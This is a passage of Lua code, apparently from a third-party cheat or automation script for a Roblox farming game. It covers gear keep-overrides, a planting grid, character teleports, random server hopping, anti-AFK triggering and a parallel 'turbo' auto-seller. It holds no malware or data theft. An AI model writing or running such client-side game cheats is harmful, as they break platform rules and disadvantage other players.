		local j = tonumber(y[Z.StackKeepOverrides.MakeKeyStackKeepOverrides(G, V)])
		if not j then
			return nil
		end
		return math.max(math.floor(j), 0)
	end,
	SetKeepAmountStackKeepOverrides = function(G, V, y)
		G = tostring(G or "")
		V = tostring(V or "")
		y = math.floor(tonumber(y) or 0)
		if G == "" or V == "" or y < 0 then
			return false
		end
		if type(h.stack_keep_overrides) ~= "table" then
			h.stack_keep_overrides = {}
		end
		h.stack_keep_overrides[Z.StackKeepOverrides.MakeKeyStackKeepOverrides(G, V)] = y
		return true
	end;
	RemoveKeepAmountStackKeepOverrides = function(G, V)
		if type(h.stack_keep_overrides) ~= "table" then
			h.stack_keep_overrides = {}
			return false
		end
		local y = Z.StackKeepOverrides.MakeKeyStackKeepOverrides(G, V)
		if h.stack_keep_overrides[y] == nil then
			return false
		end
		h.stack_keep_overrides[y] = nil
		return true
	end;
	ShouldSkipItemStackKeepOverrides = function(G, V, y)
		local j = Z.StackKeepOverrides.GetKeepAmountStackKeepOverrides(G, V)
		if j == nil then
			return false
		end
		y = math.max(math.floor(tonumber(y) or 0), 0)
		return y <= j
	end,
	GetToolCountStackKeepOverrides = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return 0
		end
		return math.max(math.floor(tonumber(G:GetAttribute("Count") or G:GetAttribute("Amount") or G:GetAttribute("Quantity") or 0) or 0), 0)
	end,
	GetGearNameFromToolStackKeepOverrides = function(G, V)
		if typeof(G) ~= "Instance" then
			return tostring(V or "")
		end
		for V, y in ipairs({
			"Sprinkler",
			"WateringCan";
			"Trowel";
			"EmptyPot"
		}) do
			local Z = G:GetAttribute(y)
			if type(Z) == "string" and Z ~= "" then
				return Z
			end
		end
		local y = tostring(G.Name or "")
		return y ~= "" and y or tostring(V or "")
	end;
	GetItemDropdownStackKeepOverrides = function(G)
		G = tostring(G or "Gear")
		if G == "Seed" then
			return Z.SeedData.GetSeedDataListDropDown()
		end
		local V = {}
		local j = {}
		local function i(G)
			G = tostring(G or "")
			if G == "" or j[G] then
				return
			end
			j[G] = true
			table.insert(V, {
				Text = G,
				Value = G
			})
		end
		for G, V in ipairs(g.AllGearShopTable or {}) do
			i(type(V) == "table" and V.name or nil)
		end
		if type(y.WateringcanData) == "table" then
			for G, V in ipairs(y.WateringcanData) do
				i(type(V) == "table" and V.Name or nil)
			end
		end
		for G, V in ipairs(Z.Backpack.GetBackpackAllItems()) do
			local y = V and (V:IsA("Tool") and ((V:GetAttribute("Sprinkler") ~= nil or V:GetAttribute("WateringCan") ~= nil or V:GetAttribute("Trowel") ~= nil or V:GetAttribute("EmptyPot") ~= nil)))
			if y and Z.StackKeepOverrides.GetToolCountStackKeepOverrides(V) > 0 then
				i(Z.StackKeepOverrides.GetGearNameFromToolStackKeepOverrides(V, V.Name))
			end
		end
		table.sort(V, function(G, V)
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return V
	end;
	GetActiveKeysStackKeepOverrides = function()
		local G = {}
		local V = h.stack_keep_overrides
		if type(V) ~= "table" then
			return G
		end
		for V, y in pairs(V) do
			if type(V) == "string" and tonumber(y) then
				table.insert(G, V)
			end
		end
		table.sort(G)
		return G
	end
}
g.MyFarmPlot = nil
g.OtherPlayerPlots = {}
Z.Farm = {
	_Random = Random.new();
	GetDefaultPlacementOptionsFarm = function()
		local G = {}
		for V, y in ipairs(W.Options) do
			G[V] = y
		end
		return G
	end,
	GetPlacementModeOptionsFarm = function(G, V, y)
		local Z = {}
		if type(V) == "table" then
			for G, V in ipairs(V) do
				table.insert(Z, V)
			end
		end
		if G == true then
			table.insert(Z, W.UseDefault)
		end
		for G, V in ipairs(W.Options) do
			table.insert(Z, V)
		end
		if type(y) == "table" then
			for G, V in ipairs(y) do
				table.insert(Z, V)
			end
		end
		return Z
	end,
	IsDefaultPlacementFarm = function(G)
		G = tostring(G or "")
		if G == W.Default then
			return true
		end
		return W.AreaByPlacement[G] ~= nil
	end,
	IsPlacementModeFarm = function(G)
		if G == W.UseDefault then
			return true
		end
		return Z.Farm.IsDefaultPlacementFarm(G)
	end;
	GetDefaultPlacementFarm = function()
		local G = tostring(h.farm_default_placement or "")
		if Z.Farm.IsDefaultPlacementFarm(G) then
			return G
		end
		return W.Default
	end;
	ResolvePlacementModeFarm = function(G)
		G = tostring(G or "")
		if G == W.UseDefault then
			return Z.Farm.GetDefaultPlacementFarm()
		end
		if Z.Farm.IsDefaultPlacementFarm(G) then
			return G
		end
		return nil
	end;
	GetPlotPlantAreaFarm = function(G, V)
		if typeof(G) ~= "Instance" or type(V) ~= "string" or V == "" then
			return nil
		end
		local y = G:FindFirstChild("Visual")
		if not y then
			return nil
		end
		local Z = y:FindFirstChild(V)
		if not Z or not Z:IsA("BasePart") then
			return nil
		end
		return Z
	end;
	GetPlacementLocalPositionFarm = function(G, V)
		G = Z.Farm.ResolvePlacementModeFarm(G)
		if G == nil or G == W.Default or not V then
			return nil
		end
		local y = - V.Size.Z / 2 + W.BackInsetStuds
		if G == W.RightFrontCenter or G == W.LeftFrontCenter then
			y = V.Size.Z / 2 - W.BackInsetStuds
		end
		return Vector3.new(0, V.Size.Y / 2, y)
	end;
	GetPlacementPositionFarm = function(G, V)
		G = Z.Farm.ResolvePlacementModeFarm(G)
		if G == nil or G == W.Default then
			return nil, nil, G
		end
		if V == nil then
			V = Z.Farm.GetOwnPlot()
		end
		local y = W.AreaByPlacement[G]
		local j = Z.Farm.GetPlotPlantAreaFarm(V, y)
		if not j then
			return nil, nil, G
		end
		local i = Z.Farm.GetPlacementLocalPositionFarm(G, j)
		if typeof(i) ~= "Vector3" then
			return nil, nil, G
		end
		return j.CFrame:PointToWorldSpace(i), j, G
	end;
	GetDefaultPlacementPositionFarm = function(G)
		return Z.Farm.GetPlacementPositionFarm(W.UseDefault, G)
	end;
	PositionVisualFolderNameFarm = "ExoFarmPositionVisuals",
	PositionVisualMarkerHeightFarm = 8,
	ClearPositionVisualsFarm = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return false
		end
		local V = G:FindFirstChild(Z.Farm.PositionVisualFolderNameFarm)
		if not V then
			return false
		end
		V:Destroy()
		return true
	end,
	ShowPositionVisualsFarm = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return false, "Farm not found"
		end
		Z.Farm.ClearPositionVisualsFarm()
		local V = Instance.new("Folder")
		V.Name = Z.Farm.PositionVisualFolderNameFarm
		V.Parent = G
		local y = {
			Color3.fromRGB(255, 230, 0);
			Color3.fromRGB(0, 255, 255);
			Color3.fromRGB(255, 80, 180),
			Color3.fromRGB(120, 255, 120),
			Color3.fromRGB(255, 140, 0)
		}
		local j = 0
		for i, c in ipairs(W.Options) do
			local J
			if c == W.Default then
				if Z.Trowel and type(Z.Trowel.GetFarmMiddleRightPositionTrowel) == "function" then
					J = Z.Trowel.GetFarmMiddleRightPositionTrowel()
				end
			else
				local V = W.AreaByPlacement[c]
				local y = Z.Farm.GetPlotPlantAreaFarm(G, V)
				if y then
					local G = Z.Farm.GetPlacementLocalPositionFarm(c, y)
					if typeof(G) == "Vector3" then
						J = y.CFrame:PointToWorldSpace(G)
					end
				end
			end
			if typeof(J) ~= "Vector3" then
				continue
			end
			local T = Z.Farm.PositionVisualMarkerHeightFarm
			local d = Instance.new("Part")
			d.Name = "FarmPosition_" .. tostring(i)
			d.Size = Vector3.new(1.5, T, 1.5)
			d.Position = J + Vector3.new(0, T / 2, 0)
			d.Anchored = true
			d.CanCollide = false
			d.CanQuery = false
			d.CanTouch = false
			d.Material = Enum.Material.Neon
			d.Color = y[i] or Color3.fromRGB(255, 255, 255)
			d.Parent = V
			local u = Instance.new("BillboardGui")
			u.Name = "PositionLabel"
			u.Adornee = d
			u.AlwaysOnTop = true
			u.Size = UDim2.fromOffset(220, 38)
			u.StudsOffset = Vector3.new(0, T / 2 + 1.5, 0)
			u.Parent = d
			local q = Instance.new("TextLabel")
			q.Name = "Text"
			q.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			q.BackgroundTransparency = .25
			q.BorderSizePixel = 0
			q.Font = Enum.Font.GothamBold
			q.Size = UDim2.fromScale(1, 1)
			q.Text = c
			q.TextColor3 = d.Color
			q.TextScaled = true
			q.Parent = u
			j += 1
		end
		if j == 0 then
			V:Destroy()
			return false, "Farm positions not found"
		end
		return true, j
	end,
	GetOwnPlot = function()
		if g.MyFarmPlot and (g.MyFarmPlot.Parent and tonumber(g.MyFarmPlot:GetAttribute("OwnerUserId")) == tonumber(g.player_userid)) then
			return g.MyFarmPlot
		end
		g.MyFarmPlot = nil
		local G = y.Workspace:FindFirstChild("Gardens")
		if not G then
			return nil
		end
		for G, V in ipairs(G:GetChildren()) do
			if tonumber(V:GetAttribute("OwnerUserId")) == tonumber(g.player_userid) then
				g.MyFarmPlot = V
				return V
			end
		end
		return nil
	end;
	GetPlantArea = function(G)
		if G ~= "PlantAreaColumn1" and G ~= "PlantAreaColumn2" then
			return nil
		end
		return Z.Farm.GetPlotPlantAreaFarm(Z.Farm.GetOwnPlot(), G)
	end;
	TeleportToCenter = function(G)
		local V = Z.Farm.GetCenterPointPart()
		if not V then
			return false
		end
		local y
		if V:IsA("BasePart") then
			y = V.CFrame
		elseif V:IsA("Model") then
			y = V:GetPivot()
		end
		if not y then
			return false
		end
		return Z.Teleport.TeleportToCFrame(y * CFrame.new(0, 3, 0), G)
	end,
	GetPlantAreaAtPosition = function(G)
		if typeof(G) ~= "Vector3" then
			return nil, nil
		end
		for V, y in ipairs(Z.Farm.GetPlantAreas()) do
			local Z = y.CFrame:PointToObjectSpace(G)
			if math.abs(Z.X) <= y.Size.X / 2 and math.abs(Z.Z) <= y.Size.Z / 2 then
				return y, Z
			end
		end
		return nil, nil
	end;
	GetMyPlantsFolder = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return nil
		end
		return G:FindFirstChild("Plants")
	end;
	GetMyPlantsFoldersNotMine = function()
		if # g.OtherPlayerPlots > 0 then
			return g.OtherPlayerPlots
		end
		g.OtherPlayerPlots = {}
		local G = y.Workspace:FindFirstChild("Gardens")
		if not G then
			return g.OtherPlayerPlots
		end
		for G, V in ipairs(G:GetChildren()) do
			if tonumber(V:GetAttribute("OwnerUserId")) ~= tonumber(g.player_userid) then
				table.insert(g.OtherPlayerPlots, V)
			end
		end
		return g.OtherPlayerPlots
	end,
	GetPlants = function()
		local G = {}
		local V = Z.Farm.GetOwnPlot()
		if not V then
			return G
		end
		local y = V:FindFirstChild("Plants")
		if not y then
			return G
		end
		for V, y in ipairs(y:GetChildren()) do
			table.insert(G, y)
		end
		local j = g.alt_Plants_Physical[g.player_userid]
		if j then
			for V, y in ipairs(j:GetChildren()) do
				table.insert(G, y)
			end
		end
		return G
	end,
	GetPermanentCenterCFrame = function()
		local G = Z.Farm.GetCenterPointPart()
		if G and G:IsA("BasePart") then
			return G.CFrame
		end
		if G and G:IsA("Model") then
			return G:GetPivot()
		end
		return nil
	end,
	GetPermanentCenterPosition = function()
		local G = Z.Farm.GetPermanentCenterCFrame()
		return G and G.Position or nil
	end;
	ProjectPositionToPlantArea = function(G, V)
		if typeof(G) ~= "Vector3" then
			return nil, nil, nil
		end
		V = math.max(tonumber(V) or 1, 0)
		local y
		local j
		local i
		local c = math.huge
		for Z, J in ipairs(Z.Farm.GetPlantAreas()) do
			local T = J.CFrame:PointToObjectSpace(G)
			local d = math.max(J.Size.X / 2 - V, 0)
			local u = math.max(J.Size.Z / 2 - V, 0)
			local q = math.clamp(T.X, - d, d)
			local g = math.clamp(T.Z, - u, u)
			local E = Vector3.new(q, J.Size.Y / 2, g)
			local a = J.CFrame:PointToWorldSpace(E)
			local H = ((a - G)).Magnitude
			if H < c then
				c = H
				y = a
				j = J
				i = E
			end
		end
		return y, j, i
	end,
	GetPermanentPlantPosition = function(G)
		local V = Z.Farm.GetPermanentCenterPosition()
		if typeof(V) ~= "Vector3" then
			return nil, nil, nil
		end
		return Z.Farm.ProjectPositionToPlantArea(V, G)
	end,
	GetDataSyncPlantsForFarmCounts = function()
		local G = {}
		local V = Z.FruitFiltersDataSync
		if not V or type(V.Plants) ~= "table" then
			return G
		end
		if not V.Started and type(V.StartSync) == "function" then
			V.StartSync()
		end
		for V, y in pairs(V.Plants) do
			if type(y) ~= "table" or y.Removed then
				continue
			end
			y.Id = tostring(y.Id or V or "")
			table.insert(G, y)
		end
		return G
	end;
	GetPlantedSeedTotalCount = function()
		local G = 0
		for V, y in ipairs(Z.Farm.GetDataSyncPlantsForFarmCounts()) do
			if type(y.PlantName) == "string" and y.PlantName ~= "" then
				G += 1
			end
		end
		return G
	end;
	GetPlantedSeedCounts = function()
		local G = {}
		for V, y in ipairs(Z.Farm.GetDataSyncPlantsForFarmCounts()) do
			local Z = tostring(y.PlantName or "")
			if Z ~= "" then
				G[Z] = ((G[Z] or 0)) + 1
			end
		end
		return G
	end,
	GetSpawnPoint = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return nil
		end
		return G:FindFirstChild("SpawnPoint")
	end,
	GetPlantAreas = function()
		local G = {}
		local V = Z.Farm.GetOwnPlot()
		if not V then
			return G
		end
		local y = V:FindFirstChild("Visual")
		if not y then
			return G
		end
		local j = {
			"PlantAreaColumn1";
			"PlantAreaColumn2"
		}
		for V, Z in ipairs(j) do
			local j = y:FindFirstChild(Z)
			if j and j:IsA("BasePart") then
				table.insert(G, j)
			end
		end
		return G
	end,
	GetCenterPointPart = function()
		local G = Z.Farm.GetOwnPlot()
		if not G then
			return nil
		end
		local V = G:FindFirstChild("Visual")
		if not V then
			return nil
		end
		local y = V:FindFirstChild("PRIM")
		return y
	end;
	DistanceFromPoint = function()
		local G = Z.Farm.GetCenterPointPart()
		if not G then
			return math.huge
		end
		local V = (y.LocalPlayer and y.LocalPlayer.Character) or y.Character
		local j = V and V:FindFirstChild("HumanoidRootPart")
		if not j then
			return math.huge
		end
		local i
		if G:IsA("BasePart") then
			i = G.Position
		elseif G:IsA("Model") then
			i = (G:GetPivot()).Position
		else
			return math.huge
		end
		return ((j.Position - i)).Magnitude
	end,
	IsNearFarm = function(G)
		G = tonumber(G) or 15
		return Z.Farm.DistanceFromPoint() <= G
	end,
	EnsureAtFarm = function(G)
		G = tonumber(G) or 15
		if Z.Farm.IsNearFarm(G) then
			return true
		end
		local V = Z.Farm.GetSpawnPoint()
		if not V or not V:IsA("BasePart") then
			return false
		end
		local j = y.LocalPlayer and y.LocalPlayer.Character or y.Character
		if not j or not j.Parent then
			return false
		end
		local i = Z.Teleport.TeleportToCFrame(V.CFrame * CFrame.new(0, 3, 0), "EnsureAtFarm")
		if not i then
			return false
		end
		task.wait(.15)
		return true
	end;
	GetRandomLocationForSeed = function(G)
		local V = Z.Farm.GetPlantAreas()
		if # V == 0 then
			return nil
		end
		local y = V[Z.Farm._Random:NextInteger(1, # V)]
		local j = math.max(tonumber(G) or .5, 0)
		local i = math.max((y.Size.X / 2) - j, 0)
		local c = math.max((y.Size.Z / 2) - j, 0)
		local J = Z.Farm._Random:NextNumber(- i, i)
		local T = Z.Farm._Random:NextNumber(- c, c)
		local d = Vector3.new(J, y.Size.Y / 2, T)
		local u = y.CFrame:PointToWorldSpace(d)
		return u, y
	end
}
g.FarmGridSpots = g.FarmGridSpots or {}
g.FarmGridSignature = ""
Z.ControlMode = {
	BothCol = "BothCol";
	RightCol = "RightCol",
	LeftCol = "LeftCol"
}
Z.FarmGrid = {
	SpacingFarmGrid = .5;
	EdgePaddingFarmGrid = 0;
	StartedFarmGrid = false;
	GetOriginPositionFarmGrid = function(G)
		if typeof(G) == "Vector3" then
			return G
		end
		if typeof(G) == "CFrame" then
			return G.Position
		end
		return Z.Farm.GetPermanentCenterPosition()
	end;
	GetColumnModeFarmGrid = function(G)
		G = tostring(G or "BothCol")
		if G == "LeftCol" or G == "RightCol" then
			return G
		end
		return "BothCol"
	end,
	GetAreaSideFarmGrid = function(G, V)
		if typeof(G) ~= "Instance" or not G:IsA("BasePart") or typeof(V) ~= "CFrame" then
			return "BothCol"
		end
		local y = V:PointToObjectSpace(G.Position)
		return y.X < 0 and "LeftCol" or "RightCol"
	end,
	GetPlantAreasFarmGrid = function(G)
		local V = {}
		local y = Z.FarmGrid.GetColumnModeFarmGrid(G)
		local j = Z.Farm.GetPermanentCenterCFrame()
		for G, i in ipairs(Z.Farm.GetPlantAreas()) do
			local c = Z.FarmGrid.GetAreaSideFarmGrid(i, j)
			if y == "BothCol" or y == c then
				table.insert(V, {
					area = i,
					side = c
				})
			end
		end
		return V
	end,
	RoundGridOffsetFarmGrid = function(G)
		G = tonumber(G) or 0
		return G >= 0 and math.floor(G + .5) or math.ceil(G - .5)
	end,
	GetSquareSortDataFarmGrid = function(G, V)
		if type(G) ~= "table" or typeof(V) ~= "Vector3" or typeof(G.areaCFrame) ~= "CFrame" then
			return math.huge, math.huge, math.huge, math.huge
		end
		local y = math.max(tonumber(Z.FarmGrid.SpacingFarmGrid) or .5, .05)
		local j = G.areaCFrame:PointToObjectSpace(V)
		local i = tonumber(G.gridMinX) or G.localPosition.X
		local c = tonumber(G.gridMaxX) or G.localPosition.X
		local J = tonumber(G.gridMinZ) or G.localPosition.Z
		local T = tonumber(G.gridMaxZ) or G.localPosition.Z
		j = Vector3.new(math.clamp(j.X, i, c), j.Y, math.clamp(j.Z, J, T))
		local d = Z.FarmGrid.RoundGridOffsetFarmGrid(((G.localPosition.X - j.X)) / y)
		local u = Z.FarmGrid.RoundGridOffsetFarmGrid(((G.localPosition.Z - j.Z)) / y)
		local q = math.max(math.abs(d), math.abs(u))
		local g = math.abs(d)
		local E = math.abs(u)
		local a = g * 2 + ((u > 0 and 1 or 0))
		local H = (Vector3.new(G.position.X - V.X, 0, G.position.Z - V.Z)).Magnitude
		return q, E, a, H
	end;
	CompareSortedSpotsFarmGrid = function(G, V)
		if G.squareRing ~= V.squareRing then
			return G.squareRing < V.squareRing
		end
		if G.squareEdgeOrder ~= V.squareEdgeOrder then
			return G.squareEdgeOrder < V.squareEdgeOrder
		end
		if G.squareEdgeStep ~= V.squareEdgeStep then
			return G.squareEdgeStep < V.squareEdgeStep
		end
		if G.distance ~= V.distance then
			return G.distance < V.distance
		end
		if G.areaName ~= V.areaName then
			return G.areaName < V.areaName
		end
		if G.localPosition.X ~= V.localPosition.X then
			return G.localPosition.X < V.localPosition.X
		end
		return G.localPosition.Z < V.localPosition.Z
	end,
	BuildSignatureFarmGrid = function()
		local G = Z.Farm.GetOwnPlot()
		local V = Z.FarmGrid.GetPlantAreasFarmGrid("BothCol")
		local y = {
			tostring(G and G:GetAttribute("GardenExpansion") or "")
		}
		for G, V in ipairs(V) do
			local Z = V.area
			table.insert(y, tostring(Z.Name))
			table.insert(y, tostring(Z.Size))
			table.insert(y, tostring(Z.CFrame))
		end
		return table.concat(y, "|")
	end;
	RebuildFarmGrid = function()
		local G = Z.Farm.GetPermanentCenterPosition()
		local V = Z.FarmGrid.GetPlantAreasFarmGrid("BothCol")
		if typeof(G) ~= "Vector3" or # V == 0 then
			return false
		end
		table.clear(g.FarmGridSpots)
		local y = Z.FarmGrid.EdgePaddingFarmGrid
		local j = Z.FarmGrid.SpacingFarmGrid
		for V, i in ipairs(V) do
			local c = i.area
			local J = math.max(c.Size.X - y * 2, 0)
			local T = math.max(c.Size.Z - y * 2, 0)
			local d = math.max(math.floor(J / j + .0001), 0)
			local u = math.max(math.floor(T / j + .0001), 0)
			local q = 2
			local E = - ((((d - 1)) * j)) / 2
			local a = - ((((u - 1)) * j)) / 2 + q
			local H = E + ((d - 1)) * j
			local r = a + ((u - 1)) * j
			for V = 1, d, 1 do
				for y = 1, u, 1 do
					local J = Vector3.new(E + ((V - 1)) * j, c.Size.Y / 2, a + ((y - 1)) * j)
					local T = c.CFrame:PointToWorldSpace(J)
					local d = {
						index = 0;
						areaName = c.Name;
						areaSide = i.side,
						areaCFrame = c.CFrame;
						gridMinX = E,
						gridMaxX = H,
						gridMinZ = a;
						gridMaxZ = r;
						localPosition = J;
						position = T
					}
					d.squareRing, d.squareEdgeOrder, d.squareEdgeStep, d.distance = Z.FarmGrid.GetSquareSortDataFarmGrid(d, G)
					table.insert(g.FarmGridSpots, d)
				end
			end
		end
		table.sort(g.FarmGridSpots, Z.FarmGrid.CompareSortedSpotsFarmGrid)
		local i = {}
		for G, V in ipairs(g.FarmGridSpots) do
			i[V.areaName] = ((i[V.areaName] or 0)) + 1
			V.index = i[V.areaName]
		end
		g.FarmGridSignature = Z.FarmGrid.BuildSignatureFarmGrid()
		return true
	end;
	EnsureCurrentFarmGrid = function()
		local G = Z.FarmGrid.BuildSignatureFarmGrid()
		if G == "" then
			return false
		end
		if G ~= g.FarmGridSignature or # g.FarmGridSpots == 0 then
			return Z.FarmGrid.RebuildFarmGrid()
		end
		return true
	end,
	GetSortedSpotsFarmGrid = function(G, V)
		if not Z.FarmGrid.EnsureCurrentFarmGrid() then
			return {}
		end
		local y = Z.FarmGrid.GetOriginPositionFarmGrid(G)
		local j = Z.FarmGrid.GetColumnModeFarmGrid(V)
		local i = {}
		if typeof(y) ~= "Vector3" then
			return i
		end
		for G, V in ipairs(g.FarmGridSpots) do
			if j == "BothCol" or V.areaSide == j then
				local G = {
					index = V.index,
					areaName = V.areaName,
					areaSide = V.areaSide;
					areaCFrame = V.areaCFrame,
					gridMinX = V.gridMinX;
					gridMaxX = V.gridMaxX,
					gridMinZ = V.gridMinZ,
					gridMaxZ = V.gridMaxZ;
					localPosition = V.localPosition;
					position = V.position
				}
				G.squareRing, G.squareEdgeOrder, G.squareEdgeStep, G.distance = Z.FarmGrid.GetSquareSortDataFarmGrid(G, y)
				table.insert(i, G)
			end
		end
		table.sort(i, Z.FarmGrid.CompareSortedSpotsFarmGrid)
		local c = {}
		for G, V in ipairs(i) do
			c[V.areaName] = ((c[V.areaName] or 0)) + 1
			V.index = c[V.areaName]
		end
		return i
	end,
	GetOpenSpotFarmGrid = function(G, V, y)
		local j = Z.FarmGrid.GetSortedSpotsFarmGrid(G, V)
		for G, V in ipairs(j) do
			if type(y) ~= "function" or y(V) == true then
				return V
			end
		end
		return nil
	end,
	GetAreaCountsFarmGrid = function(G)
		local V = {}
		for G, y in ipairs(G or g.FarmGridSpots) do
			V[y.areaName] = ((V[y.areaName] or 0)) + 1
		end
		return V
	end,
	StartFarmGrid = function()
		if Z.FarmGrid.StartedFarmGrid then
			return false
		end
		Z.FarmGrid.StartedFarmGrid = true
		task.spawn(function()
			while not g.is_forced_stop do
				Z.FarmGrid.EnsureCurrentFarmGrid()
				task.wait(2)
			end
		end)
		return true
	end
}
Z.FarmGrid.StartFarmGrid()
s.Hop = {
	Random = Random.new((((os.time() + g.player_userid) + math.floor(os.clock() * 100000))) % 2147483647),
	MaxPlayers = 8,
	PagesPerDirection = 4;
	TriedServers = {};
	TeleportToJobId = function(G, V)
		local Z = y.LocalPlayer
		G = tostring(G or "")
		V = tonumber(V) or game.PlaceId
		if not Z or G == "" then
			warn("[Hop] Missing player or JobId")
			return false
		end
		if not V or V <= 0 then
			warn("[Hop] Invalid PlaceId")
			return false
		end
		if G == game.JobId then
			warn("[Hop] Already in selected server")
			return false
		end
		local j, i = pcall(function()
			y.TeleportService:TeleportToPlaceInstance(V, G, Z)
		end)
		if not j then
			warn("[Hop] Teleport failed:", i)
			return false
		end
		return true
	end;
	GetFriendServerIds = function()
		local G = {}
		local V = y.LocalPlayer
		if not V then
			return G
		end
		local Z, j = pcall(function()
			return V:GetFriendsOnlineAsync(200)
		end)
		if not Z or type(j) ~= "table" then
			return G
		end
		for V, y in ipairs(j) do
			if type(y) ~= "table" then
				continue
			end
			local Z = tonumber(y.PlaceId)
			local j = tostring(y.GameId or "")
			if Z == game.PlaceId and j ~= "" then
				G[j] = true
			end
		end
		return G
	end,
	FetchServers = function(G, V, Z, j)
		if G ~= "Asc" and G ~= "Desc" then
			return false
		end
		local i = nil
		for c = 1, s.Hop.PagesPerDirection, 1 do
			local J = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, G)
			if i then
				J = J .. ("&cursor=" .. y.HttpService:UrlEncode(i))
			end
			local T, d = pcall(function()
				return y.HttpService:JSONDecode(game:HttpGet(J))
			end)
			if not T or type(d) ~= "table" or type(d.data) ~= "table" then
				break
			end
			for G, y in ipairs(d.data) do
				if type(y) ~= "table" then
					continue
				end
				local i = tostring(y.id or "")
				local c = tonumber(y.playing)
				local J = tonumber(y.maxPlayers)
				if i == "" or V[i] or j[i] then
					continue
				end
				if not c or J ~= s.Hop.MaxPlayers or c < 0 or c >= J then
					continue
				end
				j[i] = true
				table.insert(Z, y)
			end
			i = d.nextPageCursor
			if type(i) ~= "string" or i == "" then
				break
			end
			task.wait(.1)
		end
		return true
	end,
	FindRandomServer = function()
		local G = s.Hop.GetFriendServerIds()
		G[game.JobId] = true
		for V in pairs(s.Hop.TriedServers) do
			G[V] = true
		end
		local V = {}
		local y = {}
		s.Hop.FetchServers("Asc", G, V, y)
		s.Hop.FetchServers("Desc", G, V, y)
		if # V == 0 then
			warn("[Hop] No random non-friend server found")
			return nil
		end
		local Z = s.Hop.Random:NextInteger(1, # V)
		local j = V[Z]
		local i = tostring(j.id or "")
		if i == "" then
			return nil
		end
		s.Hop.TriedServers[i] = true
		print(string.format("[Hop] Random server: %s (%d/%d) | Pool: %d", i, tonumber(j.playing) or 0, tonumber(j.maxPlayers) or 0, # V))
		return i, j
	end;
	HopToNewServer = function()
		local G = s.Hop.FindRandomServer()
		if not G then
			return false
		end
		return s.Hop.TeleportToJobId(G, game.PlaceId)
	end;
	HopToNewServerUsingJobid = function(G)
		return s.Hop.TeleportToJobId(G, game.PlaceId)
	end
}
Z.AntiAfk = {
	RequestHop = function()
		local G = y.Networking
		if not G then
			return
		end
		local V = G.AntiAfk and G.AntiAfk.RequestHop
		if not V then
			warn("AntiAfk.RequestHop was not found")
			return false
		end
		V:Fire()
		return true
	end
}
g.SellStatusText = ""
g.SellMultiplierOverrideStatusText = ""
g.DailyDealStatusText = ""
Z.SellManager = {
	Busy = false;
	TurboMaxRequestsInFlightSellManager = 3,
	DailyDealRetryAt = 0;
	DailyDealKnown = false,
	DailyDealAvailable = false;
	DailyDealNextCheckAt = 0;
	PoorUserShecklesLimitSellManager = 10000;
	DailyDealStatusLoopStartedSellManager = false,
	FormatDailyDealTime = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		local V = math.floor(G / 3600)
		local y = math.floor(((G % 3600)) / 60)
		local Z = G % 60
		if V > 0 then
			return string.format("%dh %02dm", V, y)
		end
		if y > 0 then
			return string.format("%dm %02ds", y, Z)
		end
		return tostring(Z) .. "s"
	end;
	SetStatus = function(G, V)
		if type(G) ~= "string" or G == "" then
			g.SellStatusText = ""
			return
		end
		g.SellStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\146\176 [Seller]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
	end;
	IsTurboEnabledSellManager = function()
		local G = Z.TotalControl
		if G and type(G.ResolveTurboSellEnabledTotalControl) == "function" then
			local V = G.ResolveTurboSellEnabledTotalControl()
			if V == true then
				return true
			end
		end
		return h.turbo_sell == true
	end;
	RunTurboFruitWorkersSellManager = function(G, V)
		if type(G) ~= "table" or # G == 0 or type(V) ~= "function" then
			return false
		end
		local y = 1
		local j = math.min(# G, Z.SellManager.TurboMaxRequestsInFlightSellManager)
		local i = j
		local c = false
		local J = nil
		local T = Instance.new("BindableEvent")
		for Z = 1, j, 1 do
			task.spawn(function()
				while not c do
					local Z = y
					y += 1
					if Z > # G then
						break
					end
					local j, i = pcall(V, G[Z])
					if not j then
						if J == nil then
							J = i
						end
						c = true
						break
					end
					if i == false then
						c = true
						break
					end
				end
				i -= 1
				if i == 0 then
					T:Fire()
				end
			end)
		end
		if i > 0 then
			T.Event:Wait()
		end
		T:Destroy()
		if J ~= nil then
			error(J, 0)
		end
		return true
	end,
	SetDailyDealStatusSellManager = function(G, V)
		if type(G) ~= "string" or G == "" then
			g.DailyDealStatusText = ""
			return
		end
		g.DailyDealStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\226\173\144 [Daily Deal]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
	end;
	GetDailyDealMinimumValueSellManager = function()
		return math.max(math.floor(tonumber(h.daily_deal_min_backpack_value) or 0), 0)
	end,
	IsPoorUserForDailyDealSellManager = function()
		return ((tonumber(Z.Money.GetSheckles()) or 0)) <= Z.SellManager.PoorUserShecklesLimitSellManager
	end;
	ReadDailyDealRemainingSellManager = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = {
			"TimeRemaining",
			"timeRemaining";
			"Remaining";
			"remaining";
			"Cooldown";
			"cooldown"
		}
		for V, y in ipairs(V) do
			local Z = tonumber(G[y])
			if Z and Z > 0 then
				return Z
			end
		end
		local y = G.DailyDeal or G.dailyDeal or G.Deal or G.deal
		if y ~= nil then
			return Z.SellManager.ReadDailyDealRemainingSellManager(y)
		end
		return nil
	end,
	ReadDailyDealAvailable = function(G)
		if type(G) == "boolean" then
			return G
		end
		if type(G) == "string" then
			local V = string.lower(G)
			if V == "available" or V == "ready" or V == "true" then
				return true
			end
			if V == "used" or V == "unavailable" or V == "false" then
				return false
			end
			return nil
		end
		if type(G) ~= "table" then
			return nil
		end
		if G.Used == true or G.used == true or G.Claimed == true or G.claimed == true then
			return false
		end
		if G.Used == false or G.used == false then
			return true
		end
		local V = {
			"Available";
			"available",
			"IsAvailable";
			"isAvailable",
			"CanUse",
			"canUse",
			"Eligible",
			"eligible";
			"HasDeal",
